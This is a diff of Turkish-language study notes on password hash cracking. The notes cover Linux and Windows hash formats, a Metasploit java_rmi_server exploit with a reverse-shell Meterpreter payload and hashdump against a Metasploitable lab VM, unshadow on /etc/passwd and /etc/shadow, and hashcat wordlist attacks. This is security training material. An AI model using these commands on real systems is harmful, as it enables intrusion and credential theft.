@@ -1,8 +1,8 @@
 # Parola Ve Hash Kırma
 
-- /usr/share/wordlist/
+- /usr/share/wordlist
 
-** Hash Nedir? **
+## Hash Nedir?
 
 - Hash, bir veriyi (örneğin şifreyi) geri döndürülemez şekilde sabit uzunlukta bir değere çevirir.
 
@@ -12,7 +12,7 @@
 
 * root:$6$abc123$KJHSDkjhaskjdhaksjdhaksjdh:19000:0:99999:7::: 	
     root → kullanıcı
-	$6$ → SHA-512
+	  $6$ → SHA-512
 
 ---
 
@@ -21,25 +21,24 @@
 
 * Windows hash : admin:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
 
-** Hash'leri Toplama **
+## Hash'leri Toplama
 
-- Kali'de toplamak (metasploitable'ın)
-
-  > msfconsole
-  > use exploit/multi/misc/java_rmi_server // Java uygulamalarında. Uzaktaki (remote) objeleri çalıştırmayı sağlar
-  > show payloads
-  > set payload java/meterpreter/reverse_tcp
-  > set options
-  > meterpreter > hushdump //çıkmama ihtimali olabilir
-  > run post/linux/gather/hashdump //hashler çıkar
+- Kali'de toplamak (metasploitable)
+  - > msfconsole
+  - > use exploit/multi/misc/java_rmi_server // Java uygulamalarında. Uzaktaki (remote) objeleri çalıştırmayı sağlar
+  - > show payloads
+  - > set payload java/meterpreter/reverse_tcp
+  - > show options
+  - > meterpreter > hashdump //çıkmama ihtimali olabilir
+  - > run post/linux/gather/hashdump //hashler çıkar
 
 - Linux'te toplamak
-  > unshadow
-  > unshadow /etc/passwd /etc/shadow //hashlari birleştirir orjinal hale getirir
+  - > unshadow
+  - > unshadow /etc/passwd /etc/shadow //hashlari crack edilmek üzere birleştirir
 
 ---
 
-### Hashcat
+## Hashcat
 
 → Dünyanın en güçlü password hash kırma (cracking) aracıdır
 • GPU kullanır
@@ -48,16 +47,16 @@
 
 - Kali Linux için
 
-> hashcat -m 1800 mykalihash.txt /usr/share/wordlist/fasttract.txt // hash lerin olduğu klasöre konumlanılır. 1800 kendi hash bölümünü bul. Kali için 512 $6$ operating system olan seçilir. Sonuna wordlist eklenir. Wordlist içinde hedef password varsa şifre bulunur.
+- > hashcat -m 1800 mykalihash.txt /usr/share/wordlist/fasttract.txt // hash lerin olduğu klasöre konumlanılır. 1800 kendi hash bölümü bulunur. Kali için -m 1800 → sha512crypt ($6$ ile başlayan Linux hash) operating system olan seçilir. Sonuna wordlist eklenir. Wordlist içinde hedef password varsa şifre bulunur.
 
-> hashcat -m 1800 mykalihash.txt /usr/share/wordlist/fasttract.txt --show // Daha önce bu hash kırılmışsa kırılan hash görünür
+- > hashcat -m 1800 mykalihash.txt /usr/share/wordlist/fasttract.txt --show // Daha önce bu hash kırılmışsa kırılan hash görünür
 
-> hashcat -m 1800 mykalihash.txt /usr/share/wordlist/fasttract.txt --potfile-disable // Kırılan hash görünmez yeniden kırma işlemi yapılır.
+- > hashcat -m 1800 mykalihash.txt /usr/share/wordlist/fasttract.txt --potfile-disable // Kırılan hash görünmez yeniden kırma işlemi yapılır.
 
 - Linux için
 
-> hashcat -m 500 mylinuxhash.txt /usr/share/wordlist/fasttract.txt // hash lerin olduğu klasöre konumlanılır. 1800 kendi hash bölümünü bul. Kali için MD5 $1$ operating system olan seçilir. Sonuna wordlist eklenir. Wordlist içinde hedef password varsa şifre bulunur.
+- > hashcat -m 500 mylinuxhash.txt /usr/share/wordlist/fasttract.txt // hash lerin olduğu klasöre konumlanılır. 1800 kendi hash bölümü bulunur. Kali için MD5 $1$ operating system olan seçilir. Sonuna wordlist eklenir. Wordlist içinde hedef password varsa şifre bulunur.
 
 - Windows için
 
-> hashcat -m 1000 mywindowshash.txt /usr/share/wordlist/fasttract.txt // hash lerin olduğu klasöre konumlanılır. 1800 kendi hash bölümünü bul. Kali için NTLM operating system olan seçilir. Sonuna wordlist eklenir. Wordlist içinde hedef password varsa şifre bulunur.
+- > hashcat -m 1000 mywindowshash.txt /usr/share/wordlist/fasttract.txt // hash lerin olduğu klasöre konumlanılır. 1800 kendi hash bölümü bulunur. Kali için NTLM operating system olan seçilir. Sonuna wordlist eklenir. Wordlist içinde hedef password varsa şifre bulunur.
